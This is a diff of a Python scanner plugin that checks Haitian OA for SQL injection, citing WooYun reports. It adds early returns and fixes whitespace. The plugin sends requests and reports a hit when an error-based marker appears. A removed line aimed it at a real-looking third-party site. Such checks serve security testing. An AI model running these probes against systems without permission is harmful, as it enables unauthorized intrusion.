@@ -4,16 +4,16 @@
 '''
 name: 海天OA多处SQL注入
 author: yichin
-refer: 
+refer:
     http://www.wooyun.org/bugs/wooyun-2010-083161
     http://www.wooyun.org/bugs/wooyun-2010-082495
     http://www.wooyun.org/bugs/wooyun-2010-084195
     http://www.wooyun.org/bugs/wooyun-2010-082673
     http://www.wooyun.org/bugs/wooyun-2015-0118048
     http://www.wooyun.org/bugs/wooyun-2015-0122661
-    
+
 description:
-    
+
 '''
 
 def assign(service, arg):
@@ -41,6 +41,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(url)
         if (code == 200) and ('WtFaBcMicrosoft SQL Server' in res):
             security_hole("SQL Injection: " + url)
+            return arg
     content_type = 'Content-Type: application/x-www-form-urlencoded'
     #POST 型
     urls = [
@@ -57,6 +58,7 @@ def audit(arg):
         code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
         if(code == 200 and 'WtFaBcMicrosoft SQL Server' in res):
             security_hole('SQL Injection: ' + url + ' POST:' +data)
-if __name__ == '__main__':
+
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('haitianoa', 'http://www.fzsyxx.com/oa/')[1])
